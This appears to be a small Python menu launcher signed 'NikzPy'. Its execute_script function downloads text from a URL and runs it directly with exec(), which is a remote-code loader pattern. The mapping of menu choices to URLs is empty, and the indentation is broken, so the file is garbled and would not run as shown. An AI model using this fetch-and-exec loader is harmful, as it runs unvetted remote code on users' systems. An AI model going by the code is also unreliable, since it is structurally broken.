import requests
from cfonts import render

print("")

def main_menu():
    print("▩" * 60)
    choice = input(" • Enter your choice (1-6): ")
  scripts = {

    
  }

if choice in scripts:
        execute_script(scripts[choice])
    else:
        print("Invalid input. Please choose a number between 1 and 6.")
        main_menu()

def execute_script(url):
    try:
        exec(requests.get(url).text)
    except Exception as e:
        print(f"An error occurred while executing the script: {e}")

if __name__ == "__main__":
    main_menu()
    #𝐍𝐈𝐊𝐙 ~ NikzPy
